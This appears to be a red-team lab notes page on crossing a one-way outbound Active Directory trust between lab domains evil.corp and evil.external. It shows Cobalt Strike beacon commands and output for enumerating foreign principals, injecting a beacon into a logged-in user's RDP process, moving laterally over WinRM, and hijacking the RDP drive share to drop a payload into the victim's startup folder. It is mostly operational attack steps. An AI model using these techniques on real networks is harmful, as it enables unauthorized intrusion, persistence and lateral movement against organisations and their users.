# One-Way (Outbound)
This can be a difficult trust to exploit.
Idea:
* Domain A trusts Domain B
* Domain B can access Domain A
* Domain A can not access Domain B.

Techniques:
* SQL Server link created in the opposite direction of the domain trust (see [[MS SQL Servers]]).
* RDP drive sharing (or RDPInception).  
When a user enables drive sharing for their RDP session, it mounts a folder on the target machine that maps back to their local machine. If the target machine is compromised, we may migrate into the user's RDP session and use this mount-point to write files directly onto the machine. This is useful for dropping payloads into their startup folder which would be executed the next time they logon.

We are here: evil.corp
Target: get to evil.external
Our domain trusts their domain (outbound)

evil.corp has an outbound trust with evil.external.
```beacon
beacon> powershell Get-DomainTrust -Domain evil.corp

SourceName      : evil.corp
TargetName      : evil.external
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound
WhenCreated     : 2/19/2022 10:15:24 PM
WhenChanged     : 2/19/2022 10:15:24 PM
```

Since outbound is defined, enumeration of the foreign domain will fail:
>Exception calling "FindAll" with "0" argument(s): "A referral was returned from the server.

1. **The strategy is to find principals in our `evil.corp` domain that are from our target domain `evil.external`.**
[[PowerView#Get Groups containing users outside of this domain]]

This shows us that there's a domain group in `evil.corp` called `Jump Users`, which contains principals that are not from `evil.corp`. These `ForeignSecurityPrincipals` are like aliases, and can't be resolved like `ConvertFrom-SID` to find out what that principal actually is.

2. Move laterally to instances where members of the `Jump Users` group have privileged access (local admins, RDP/WinRM/DCOM access etc).
- `First Degree RDP Privileges` ([[BloodHound]])
- [[PowerView#Machines that have identity assigned to a target group]]
4. Camp there until you see a member authenticate. Then, impersonate them to hop the trust.
```beacon
beacon> getuid
[*] You are NT AUTHORITY\SYSTEM (admin)

beacon> run hostname
sql1

beacon> net logons
Logged on users at \\localhost:

DEV\michael
EDU\SQL-1$

beacon> shell netstat -anop tcp | findstr 3389
  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       1012
  TCP    10.10.15.90:3389       10.10.18.221:50145     ESTABLISHED     1012

beacon> ps
 PID   PPID  Name                         Arch  Session     User
 ---   ----  ----                         ----  -------     -----
 644   776   ShellExperienceHost.exe      x64   3           DEV\michael
 4960  1012  rdpclip.exe                  x64   3           DEV\michael
 4980  696   svchost.exe                  x64   3           DEV\michael
 
beacon> portscan 10.10.18.0/24 139,445,3389,5985 none 1024
10.10.18.221:3389
10.10.18.221:5985

10.10.18.167:139
10.10.18.167:445
10.10.18.167:3389
10.10.18.167:5985

Scanner module is complete
```
5. Inject a beacon into his process
```beacon
beacon> inject 4960 x64 tcp-local
[+] established link to child beacon: 10.10.15.90

beacon> getuid
[*] You are DEV\michael

beacon> powershell Get-Domain
Forest                  : evil.external
DomainControllers       : {dc-01.evil.external}
```
6. Check permissions of the use:
   We didn't see port 445 open, so we can't do anything over file shares, but 5985. Since the firewall is active we use a privot listener or open a port via [[Set windows firewall rule]].
```beacon
beacon> remote-exec winrm sql01.evil.external whoami; hostname

DEV\michael
sql01

beacon> jump winrm64 sql01.evil.external pivot-sql1
[+] established link to child beacon: 10.10.18.221
```
7. If **no** admin try to hijack the RDP drive sharing
   Inside the RDP session on SQL-1, there's a UNC path called `tsclient` which has a mount point for every drive that is being shared over RDP. `\\tsclient\c` is the C: drive on the origin machine of the RDP session, in this case `sql01.evil.external`. This gives us the equivalent of standard user read/write access to that drive.
8. Drop binary into startup
```beacon
beacon> cd \\tsclient\c\Users\michael\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
beacon> upload C:\Payloads\pivot.exe
beacon> ls

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
 174b     fil     05/15/2022 19:00:25   desktop.ini
 281kb    fil     05/15/2022 20:31:00   pivot.exe
```


## Tools
########
########


```meta
ttp: T1000
requirements:
results: 
description: 
```